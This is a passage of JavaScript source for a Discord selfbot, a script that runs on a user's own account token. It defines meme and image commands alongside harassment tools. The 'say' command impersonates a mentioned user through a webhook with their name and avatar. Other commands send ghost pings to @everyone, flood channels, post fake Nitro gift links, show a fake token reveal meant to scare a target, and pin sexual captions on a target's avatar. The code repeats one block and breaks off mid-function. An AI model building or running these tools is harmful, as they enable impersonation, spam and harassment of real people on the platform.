                .addField("**```" + prefix + "crush + MENTION ```**", `***${language.CRUSH_DESC}.***`)
                .addField("**```" + prefix + "facebook + MENTION + TEXT ```**", `***${language.FACEBOOK_DESC}.***`)
                .addField("**```" + prefix + "dictator + MENTION ```**", `***${language.DICTATOR_DESC}.***`)
                .addField("**```" + prefix + "fire + MENTION ```**", `***${language.FIRE_DESC}.***`)
                .addField("**```" + prefix + "gay + MENTION ```**", `***${language.GAY_DESC}.***`)
                .addField("**```" + prefix + "jail + MENTION ```**", `***${language.JAIL_DESC}.***`)
                .addField("**```" + prefix + "PS4 + MENTION ```**", `***${language.PS4_DESC}.***`)
                .addField("**```" + prefix + "rejected + MENTION ```**", `***${language.REJECTED_DESC}.***`)
                .addField("**```" + prefix + "rip + MENTION ```**", `***${language.RIP_DESC}.***`)
                .addField("**```" + prefix + "scary + MENTION ```**", `***${language.SCARY_DESC}.***`)
                .addField("**```" + prefix + "sniper + MENTION ```**", `***${language.SNIPER_DESC}.***`)
                .addField("**```" + prefix + "tobecontinued + MENTION ```**", `***${language.TOBECONTINUED}.***`)
                .addField("**```" + prefix + "subzero + MENTION ```**", `***${language.SUBZERO_DESC}.***`)
                .addField("**```" + prefix + "triggered + MENTION ```**", `***${language.TRIGGERED_DESC}.***`)
                .addField("**```" + prefix + "utatoo + MENTION ```**", `***${language.UTATOO_DESC}.***`)
                .addField("**```" + prefix + "wanted + MENTION ```**", `***${language.WANTED_DESC}.***`)
                .addField("**```" + prefix + "wasted + MENTION ```**", `***${language.WASTED_DESC}.***`)
                .addField("**```" + prefix + "hitler + MENTION ```**", `***${language.WORSETHANHITLER_DESC}.***`)
                .addField("**```" + prefix + "beautiful + MENTION ```**", `***${language.BEAUTIFUL_DESC}.***`)
                .addField("**```" + prefix + "affect + MENTION ```**", `***${language.AFFECT_DESC}.***`)
                .addField("**```" + prefix + "react + TEXT ```**", `***${language.REACT_DESC}.***`)

            const help4 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "dance ```**", `***${language.DANCE_DESC}.***`)
                .addField("**```" + prefix + "suicide ```**", `***${language.SUICIDE_DESC}.***`)
                .addField("**```" + prefix + "kiss + MENTION ```**", `***${language.KISS_DESC}.***`)
                .addField("**```" + prefix + "love + MENTION ```**", `***${language.LOVE_DESC}.***`)
                .addField("**```" + prefix + "spank + MENTION ```**", `***${language.SPANK_DESC}.***`)
                .addField("**```" + prefix + "calcul + NUMBER ```**", `***${language.CALCUL_DESC}.***`)
                .addField("**```" + prefix + "hug + MENTION ```**", `***${language.HUG_DESC}.***`)
                .addField("**```" + prefix + "pat + MENTION ```**", `***${language.PAT_DESC}.***`)
                .addField("**```" + prefix + "wink + MENTION ```**", `***${language.WINK_DESC}.***`)
                .addField("**```" + prefix + "sus + MENTION ```**", `***${language.SUS_DESC}.***`)
                .addField("**```" + prefix + "stonk + MENTION ```**", `***${language.STONK_DESC}.***`)
                .addField("**```" + prefix + "montage + MENTION ```**", `***${language.MONTAGE_DESC}.***`)
                .addField("**```" + prefix + "affectmybaby + MENTION ```**", `***${language.AFFECTMYBABY_DESC}.***`)
                .addField("**```" + prefix + "paintart + MENTION ```**", `***${language.PAINTART_DESC}.***`)
                .addField("**```" + prefix + "deletetrash + MENTION ```**", `***${language.DELETETRASH}.***`)
                .addField("**```" + prefix + "lisapresentation + TEXT ```**", `***${language.LISAPRESENTATION}.***`)
                .addField("**```" + prefix + "m&m's + MENTION ```**", `***${language.MNMS_DESC}.***`)
                .addField("**```" + prefix + "notstonk + MENTION ```**", `***${language.NOTSTONK_DESC}.***`)
                .addField("**```" + prefix + "poutine + MENTION ```**", `***${language.POUTINE_DESC}.***`)
                .addField("**```" + prefix + "restinpeace + MENTION ```**", `***${language.RESTINPEACE_DESC}.***`)
                .addField("**```" + prefix + "giveaspank + MENTION ```**", `***${language.GIVEASPANK_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            message.channel.send(help2)
            message.channel.send(help3)
            message.channel.send(help4)
            consolelog("information", `${language.DEBUG_LOG_FUN_SEND}.`)
        }

        if (cmd === "faketyping") 
        {
            if (typing_mode === "false") 
            {
                typing_mode = "true";
                message.delete()
                DoNotif(`${language.FAKETYPING_ON_NOTIF}`)
                message.channel.startTyping();
            } else {
                typing_mode = "false";
                message.delete()
                DoNotif(`${language.FAKETYPING_OFF_NOTIF}`)
                return message.channel.stopTyping();
            }
        }

        if (cmd === "annoying") 
        {
            message.delete()
            message.channel.send(`The Eiffel Tower (/ˈaɪfəl/ EYE-fəl; French: tour Eiffel [tuʁ‿ɛfɛl] (About this soundlisten)) is a wrought-iron lattice tower on the Champ de Mars in Paris, France. It is named after the engineer Gustave Eiffel, whose company designed and built the tower.`)
            message.channel.send(`Locally nicknamed "La dame de fer" (French for "Iron Lady"), it was constructed from 1887 to 1889 as the entrance to the 1889 World's Fair and was initially criticised by some of France's leading artists and intellectuals for its design, but it has become a global cultural icon of France and one of the most recognisable structures in the world.[3] The Eiffel Tower is the most-visited paid monument in the world; 6.91 million people ascended it in 2015.`)
            message.channel.send(`The tower is 324 metres (1,063 ft) tall, about the same height as an 81-storey building, and the tallest structure in Paris. Its base is square, measuring 125 metres (410 ft) on each side. During its construction, the Eiffel Tower surpassed the Washington Monument to become the tallest man-made structure in the world, a title it held for 41 years until the Chrysler Building in New York City was finished in 1930.`)
            message.channel.send(`It was the first structure in the world to surpass both the 200 meter and 300 meter mark in height. Due to the addition of a broadcasting aerial at the top of the tower in 1957, it is now taller than the Chrysler Building by 5.2 metres (17 ft). Excluding transmitters, the Eiffel Tower is the second tallest free-standing structure in France after the Millau Viaduct.`)
            message.channel.send(`The tower has three levels for visitors, with restaurants on the first and second levels. The top level's upper platform is 276 m (906 ft) above the ground – the highest observation deck accessible to the public in the European Union. Tickets can be purchased to ascend by stairs or lift to the first and second levels. The climb from ground level to the first level is over 300 steps, as is the climb from the first level to the second. Although there is a staircase to the top level, it is usually accessible only by lift.`)
            message.channel.send(`The design of the Eiffel Tower is attributed to Maurice Koechlin and Émile Nouguier, two senior engineers working for the Compagnie des Établissements Eiffel. It was envisioned after discussion about a suitable centrepiece for the proposed 1889 Exposition Universelle, a world's fair to celebrate the centennial of the French Revolution.`)
            message.channel.send(`Eiffel openly acknowledged that inspiration for a tower came from the Latting Observatory built in New York City in 1853.[4] In May 1884, working at home, Koechlin made a sketch of their idea, described by him as "a great pylon, consisting of four lattice girders standing apart at the base and coming together at the top, joined together by metal trusses at regular intervals".`)
            message.channel.send(`Eiffel initially showed little enthusiasm, but he did approve further study, and the two engineers then asked Stephen Sauvestre, the head of company's architectural department, to contribute to the design.`)
            message.channel.send(`Sauvestre added decorative arches to the base of the tower, a glass pavilion to the first level, and other embellishments.`)
            message.channel.send(`The new version gained Eiffel's support: he bought the rights to the patent on the design which Koechlin, Nougier, and Sauvestre had taken out, and the design was exhibited at the Exhibition of Decorative Arts in the autumn of 1884 under the company name. On 30 March 1885, Eiffel presented his plans to the Société des Ingénieurs Civils; after discussing the technical problems and emphasising the practical uses of the tower, he finished his talk by saying the tower would symbolise:`)
            message.channel.send(`n]ot only the art of the modern engineer, but also the century of Industrand Science in which we are living, and for which the way was prepared by the great scientific movement of the eighteenth century and by the Revolution of 1789, to which this monument will be built as an expression of France's gratitude.`)
            message.channel.send(`Little progress was made until 1886, when Jules Grévy was re-elected as president of France and Édouard Lockroy was appointed as minister for trade. A budget for the exposition was passed and, on 1 May, Lockroy announced an alteration to the terms of the open competition being held for a centrepiece to the exposition, which effectively made the selection of Eiffel's design a foregone conclusion, as entries had to include a study for a 300 m (980 ft) four-sided metal tower on the Champ de Mars.`)
        }

        if (cmd === "insult") 
        {
            const user = message.mentions.users.first()
            message.delete()
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            var USERNAME = user.username

            fetch('https://insult.mattbas.org/api/insult.txt?who=').then(res => res.text()).then(text => message.channel.send(USERNAME + text))
        }

        if (cmd === "say") 
        {
            let server = message.guild;
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)

            const user = message.mentions.users.first()
            let msg = args.slice(1).join(" ");

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            if (!msg) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            message.delete()
            if (!message.member.hasPermission(['MANAGE_GUILD'])) return DoNotif(`${language.ERROR_COMMANDS_MANAGE_GUILD}`)
            message.channel.createWebhook(user.username, user.displayAvatarURL).then(wb => 
                {
                var Hook = new hookcord.Hook()
                    .setLink(`https://discordapp.com/api/webhooks/${wb.id}/${wb.token}`)
                    .setPayload({
                        'title': user.username,
                        'avatar': user.displayAvatarURL,
                        'content': msg
                    })
                    .fire()
                    .then(function(response) 
                    {
                        wb.delete();
                    }).catch(function(e) {})
            })
        }

        if (cmd === "ghostping") 
        {
            let server = message.guild;
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)

            message.delete()
            message.channel.send("@everyone")
            message.channel.fetchMessages({
                limit: Math.min(0 + 1, 100, 200)
            }).then(messages => {
                messages.forEach(m => 
                    {
                    m.delete().catch(console.error);
                });
            })
        }

        if (cmd === "clean") 
        {
            message.delete()
            const invisible_text = `‎‎‎‎‎‎‎‎‎‎`;
            const invisible_space = `᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼
            ᲼᲼᲼᲼᲼᲼`;

            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
            message.channel.send(invisible_text);
            message.channel.send(invisible_space);
        }

        if (cmd === "meme") 
        {
            message.delete()

            var subreddits = [
                'meme',
            ]
            var sub = subreddits[Math.round(Math.random() * (subreddits.length - 1))];

            randomPuppy(sub)
                .then(url => 
                    {
                    const embed = new Discord.RichEmbed()
                        .setColor(color)
                        .setAuthor("Meme", client.user.avatarURL)
                        .setImage(url)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                        embed.setTimestamp();
                    message.channel.send({
                        embed
                    });
                })
        }

        if (cmd === "animememe") 
        {
            message.delete();

            var subreddits = [
                'animememe',
            ]
            var sub = subreddits[Math.round(Math.random() * (subreddits.length - 1))];

            randomPuppy(sub)
                .then(url => 
                    {
                    const embed = new Discord.RichEmbed()
                        .setColor(color)
                        .setAuthor("Anime Meme", client.user.avatarURL)
                        .setImage(url)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                        embed.setTimestamp();
                    message.channel.send({
                        embed
                    });
                })
        }

        if (cmd === "stealpfp") 
        {
            let server = message.guild;
            let user = message.mentions.users.first();
            message.delete()

            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)

            let avatar = new Discord.RichEmbed()
                .setTitle('**𝘼𝙫𝙖𝙩𝙖𝙧 𝙎𝙩𝙚𝙖𝙡𝙚𝙧**')
                .setColor(color)
                .setDescription("**Avatar from " + user.username + "#" + user.discriminator + "**")
                .setImage(user.avatarURL)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
            avatar.setTimestamp();

            message.channel.send(avatar);
        }

        if (cmd === "minefont") 
        {
            let number = message.content.split(" ")[1]
            let msg = args.slice(1).join(" ");
            message.delete()

            if (!number) return DoNotif(`${language.ERROR_COMMANDS_NUMBERS_NOTIF}`)
            if (!msg) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var text = encodeURI(msg);

            message.channel.send("https://minecraftskinstealer.com/achievement/" + number + "/Achievement+Get%21/" + text);
        }

        if (cmd === "phcomment") 
        {
            const user = message.mentions.users.first()
            let text = args.slice(1).join(" ");
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            phmsg();

            async function phmsg() 
            {
                const res = await fetch(encodeURI(`https://nekobot.xyz/api/imagegen?type=phcomment&username=${user.username}&image=${user.avatarURL}&text=${text}`));
                const json = await res.json();

                const embed = new Discord.RichEmbed()
                    .setImage(json.message)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "trumptweet") 
        {
            let text = args.slice(0).join(" ");
            message.delete()

            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            trumpmsg();

            async function trumpmsg() 
            {
                const res = await fetch(encodeURI(`https://nekobot.xyz/api/imagegen?type=trumptweet&text=${text}`));
                const json = await res.json();

                const embed = new Discord.RichEmbed()
                    .setImage(json.message)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "awooify") 
        {
            const user = message.mentions.users.first()
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            animeface();

            async function animeface() 
            {
                let msg = args.slice(0).join(" ");

                let img = await Nekow.generate("awooify", 
                {
                    url: user.avatarURL
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**User awooify**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "baguette") 
        {
            const user = message.mentions.users.first()
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            baguette();

            async function baguette() 
            {
                let msg = args.slice(0).join(" ");

                let img = await Nekow.generate("baguette", 
                {
                    url: user.avatarURL
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**User baguette**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "blurpify") 
        {
            const user = message.mentions.users.first()
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            blurpify();

            async function blurpify() 
            {
                let msg = args.slice(0).join(" ");

                let img = await Nekow.generate("blurpify", 
                {
                    image: user.avatarURL
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**User blurpify**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "captcha") 
        {
            const user = message.mentions.users.first()
            let text = args.slice(0).join(" ");
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            captcha();

            async function captcha() 
            {
                let msg = args.slice(0).join(" ");

                let img = await Nekow.generate("captcha", 
                {
                    url: user.avatarURL,
                    username: text
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**User captcha**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "changemymind") 
        {
            let text = args.slice(0).join(" ");
            message.delete()

            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            changemymind();

            async function changemymind() 
            {
                let msg = args.slice(0).join(" ");

                let img = await Nekow.generate("changemymind", {
                    text: text
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "changenick") 
        {
            var server = message.guild.id;
            let text = args.slice(0).join(" ");
            message.delete()

            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)

            ChangeNickname();

            function ChangeNickname() 
            {
                var postData = {
                    nick: text,
                };
                let axiosConfig = {
                    headers: {
                        'content-type': 'application/json',
                        'authorization': token
                    }
                };
                axios.patch(`https://discord.com/api/${Discord_Version}/guilds/` + server + '/members/%40me/nick', postData, axiosConfig)
            }
        }

        if (cmd === "rainbowroles") 
        {
            var server = message.guild.id;
            let rolename = args.slice(0).join(" ");
            var role = message.guild.roles.find(role => role.name === rolename);
            let amsg = args.slice(0).join(" ");
            message.delete()
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)
            if (!rolename) return DoNotif("```Add the name of the role you want to rainbow. ❌```")


            if (amsg === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Rainbow Roles has been stopped. ✅```");
            }

            if (!interval) 
            {
                interval = setInterval(() => 
                {
                    function getRandomColor() 
                    {
                        var letters = '0123456789ABCDEF';
                        var color = '#';
                        for (var i = 0; i < 6; i++) {
                            color += letters[Math.floor(Math.random() * 16)];
                        }
                        return color;
                    }

                    role.edit({
                        color: getRandomColor()
                    })
                }, 1000);
            } else {
                message.channel.send('a loop is already running');
            };

            DoNotif("```Rainbow Roles started ✅ for stop it type " + prefix + "rainbowroles stop```");
        }

        if (cmd === "loading") 
        {
            setTimeout(() => {
                message.edit('░░░░░░░░░░ 0%');
            }, 1000);
            setTimeout(() => {
                message.edit('▓▓░░░░░░░░ 20%');
            }, 3500);
            setTimeout(() => {
                message.edit('▓▓▓▓░░░░░░ 40%');
            }, 9000);
            setTimeout(() => {
                message.edit('▓▓▓▓▓▓░░░░ 60%');
            }, 13500);
            setTimeout(() => {
                message.edit('▓▓▓▓▓▓▓▓░░ 80%');
            }, 19000);
            setTimeout(() => {
                message.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
            }, 25500);
            setTimeout(() => {
                message.edit('fuck u :3');
            }, 26500);
        }

        if (cmd === "testlove") 
        {
            const user = message.mentions.users.first()
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            message.delete()
            var loveit = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'][Math.floor(Math.random() * 20)]

            let love = new Discord.RichEmbed()
                .setColor(color)
                .addField("Calculate the possible loves for " + client.user.username + " and " + user.username + "", "" + loveit + " ❤")
                .setImage("https://i.pinimg.com/originals/0e/de/d0/0eded02148d997485272bb52eaf17656.jpg")
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
            love.setTimestamp();

            message.channel.send(love);
        }

        if (cmd === "nitrogen") 
        {
            function randomstring(L) 
            {
                var s = '';
                var randomchar = function() 
                {
                    var n = Math.floor(Math.random() * 62);
                    if (n < 10) return n; //1-10
                    if (n < 36) return String.fromCharCode(n + 55); //A-Z
                    return String.fromCharCode(n + 61); //a-z
                }
                while (s.length < L) s += randomchar();
                return s;
            }

            const nitrogen = new Discord.RichEmbed()
                .setColor(color)
                .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
                .addField('Gift :', '|| https://discord.gift/' + randomstring(16) + ' ||');
            message.edit(nitrogen)
        }

        if (cmd === "editedmsg") 
        {
            const invisible_text = `‎‎‎‎‎‎‎‎‎‎‎‎`;
            message.edit(invisible_text);
        }

        if (cmd === "showtoken") 
        {
            const user = message.mentions.users.first()
            message.delete()
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)

            let token = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'];
            let lastpart = ['a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'];

            var theid = user.id;
            var idencode = utf8.encode(theid);
            var gotid = base64.encode(idencode);

            let embed = new Discord.RichEmbed()
                .setColor(color)
                .setTitle('Token match ' + user.username + '')
                .setDescription('' + gotid + '.' + token[Math.floor(Math.random() * ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'].length)] + '.' + lastpart[Math.floor(Math.random() * ['a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'].length)] + '');

            message.channel.send(embed)
        }

        if (cmd === "8ball")
        {
            let question = args.slice(0).join(" ");
            message.delete()
            if (!question) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            var random_reply = ['Yes!', 'No.', 'Maybe?', 'Probably', 'I dont think', 'Never!', 'You can try..'][Math.floor(Math.random() * 7)]

            message.channel.send("**" + client.user.tag + " have ask the question: " + question + "**")

            let thereply = new Discord.RichEmbed()
            .setColor(color)
            .setTitle('8ball have say:')
            .setDescription(random_reply);

            message.channel.send(thereply)
        }

        if (cmd === "clyde")
        {
            let text = args.slice(0).join(" ");
            message.delete()
            
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            clydeimg();

            async function clydeimg() 
            {
                let img = await Nekow.generate("clyde", 
                {
                    text: text
                }); // returns a string.

                sleep(1000);

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "deepfry")
        {
            const user = message.mentions.users.first()     
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            deepfry();

            async function deepfry() 
            {
                let img = await Nekow.generate("deepfry", 
                {
                    image: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "fact")
        {         
            let text = args.slice(0).join(" ");
            message.delete()

            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            fact();

            async function fact() 
            {
                let img = await Nekow.generate("fact", 
                {
                    text: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "iphonex")
        {
            let text = args.slice(0).join(" "); 
            message.delete()
            
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYURL_NOTIF}`)
            iphonex();

            async function iphonex() 
            {
                let img = await Nekow.generate("iphonex", 
                {
                    url: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "jpeg")
        {
            let text = args.slice(0).join(" "); 
            message.delete()
            
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYURL_NOTIF}`)
            jpeg();

            async function jpeg() 
            {
                let img = await Nekow.generate("jpeg", 
                {
                    url: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "kannagen")
        {
            let text = args.slice(0).join(" ");
            message.delete()

            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            kannagen();

            async function kannagen() 
            {
                let img = await Nekow.generate("kannagen", 
                {
                    text: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "lolice")
        {
            let text = args.slice(0).join(" "); 
            message.delete()
            
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYURL_NOTIF}`)
            lolice();

            async function lolice() 
            {
                let img = await Nekow.generate("lolice", 
                {
                    url: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "lolice")
        {
            let text = args.slice(0).join(" "); 
            message.delete()
            
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYURL_NOTIF}`)
            lolice();

            async function lolice() 
            {
                let img = await Nekow.generate("lolice", 
                {
                    url: text
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "magik")
        {
            const user = message.mentions.users.first()     
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            magik();

            async function magik() 
            {
                let img = await Nekow.generate("magik", 
                {
                    image: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "ship")
        {
            const user = message.mentions.users.first()     
            let text = args.slice(1).join(" "); 
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYURL_NOTIF}`)
            ship();

            async function ship() 
            {
                let img = await Nekow.generate("ship", 
                {
                    user1: text,
                    user2: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "threats")
        {
            const user = message.mentions.users.first()     
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            threats();

            async function threats() 
            {
                let img = await Nekow.generate("threats", 
                {
                    url: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "trap")
        {
            const user = message.mentions.users.first()     
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            trap();

            async function trap() 
            {
                let img = await Nekow.generate("trap", 
                {
                    author: "Ohh Onii Chan, Under his skirt was a big dick, ready to be sucked.",
                    image: user.avatarURL,
                    name: user.username
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "trash")
        {
            const user = message.mentions.users.first()     
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            trash();

            async function trash() 
            {
                let img = await Nekow.generate("trash", 
                {
                    url: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "tweet")
        {
            const user = message.mentions.users.first()     
            let text = args.slice(1).join(" "); 
            message.delete()
            
            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            if (!text) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`)
            tweet();

            async function tweet() 
            {
